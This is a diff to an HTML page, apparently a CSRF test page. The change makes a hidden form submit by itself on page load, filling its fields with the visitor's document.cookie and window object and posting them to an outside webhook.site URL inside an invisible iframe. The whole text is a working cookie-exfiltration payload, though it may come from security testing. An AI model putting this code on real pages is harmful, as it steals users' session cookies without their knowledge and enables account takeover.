@@ -5,12 +5,15 @@
                     <iframe  name="frame"></iframe>
 
                     <form method="post" action="https://webhook.site/debe482d-4f6b-4bba-a5e3-c75e4db2418a" target="frame" id="form">
-                        <input type="hidden" name="title" value="CSRF" />
-                        <input type="hidden" name="body" value="CSRF" />
+                        <input type="hidden" name="title" id="cookie" value="CSRF" />
+                        <input type="hidden" name="body" id="window" value="CSRF" />
                         <input type="hidden" name="user" value="tester" />
                     </form>
 
-                    <script>document.getElementById('form').submit()</script>
+                    <script>
+                      document.getElementById('cookie').value = document.cookie
+                      document.getElementById('window').value = window
+                        document.getElementById('form').submit()</script>
 
                 </body>
 </html>
